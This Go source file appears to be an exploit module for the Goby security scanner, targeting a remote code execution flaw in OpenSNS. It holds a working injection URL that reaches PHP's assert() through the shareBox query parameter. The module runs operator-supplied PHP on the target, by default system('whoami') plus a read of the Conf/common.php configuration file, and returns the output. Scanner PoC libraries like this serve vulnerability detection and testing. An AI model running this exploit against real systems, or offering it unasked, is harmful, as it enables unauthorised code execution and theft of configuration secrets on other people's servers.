package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "OpenSNS Remote Code Execution",
    "Description": "OpenSNS Remote Code Execution",
    "Product": "OpenSNS",
    "Homepage": "http://www.opensns.cn/",
    "DisclosureDate": "2021-06-17",
    "Author": "ovi3",
    "GobyQuery": "product=\"OpenSNS\"",
    "Level": "3",
    "Impact": "Remote Code Execution",
    "Recommendation": "Update",
    "References": [
        "https://www.pwnwiki.org/index.php?title=OpenSNS_%E9%81%A0%E7%A8%8B%E4%BB%A3%E7%A2%BC%E5%9F%B7%E8%A1%8C%E6%BC%8F%E6%B4%9E/zh-cn"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "phpCode",
            "type": "createSelect",
            "value": "system(\"whoami\"),var_dump(file_get_contents(\"./Conf/common.php\"))",
            "show": ""
        }
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/index.php?s=weibo/Share/shareBox&query=app=Common%26model=Schedule%26method=runSchedule%26id[status]=1%26id[method]=Schedule-%3E_validationFieldItem%26id[4]=function%26id[0]=ooo%26id[1]=assert%26id[args]=ooo%3dvar_dump(md5(\"12t\"))",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "string(32) \"e4c5598222b09b8e5ea7f3d510967b9e\"",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": null,
    "Tags": [
        "rce"
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": [
            "OpenSNS"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "6814"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			phpCode := ss.Params["phpCode"].(string)
			uri := `/index.php?s=weibo/Share/shareBox&query=app=Common%26model=Schedule%26method=runSchedule%26id[status]=1%26id[method]=Schedule-%3E_validationFieldItem%26id[4]=function%26id[0]=ooo%26id[1]=assert%26id[args]=ooo%3d` + url.QueryEscape(phpCode)
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false

			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					m := regexp.MustCompile(`(?s)<div class="col-xs-12">\s*?<div>(.*?)<a class="" target=`).FindStringSubmatch(resp.Utf8Html)
					if len(m) > 0 {
						expResult.Success = true
						expResult.Output = strings.TrimSpace(m[1])
					} else {
						expResult.Output = resp.Utf8Html // 可能包含程序报错信息
					}
				}
			}
			return expResult
		},
	))
}
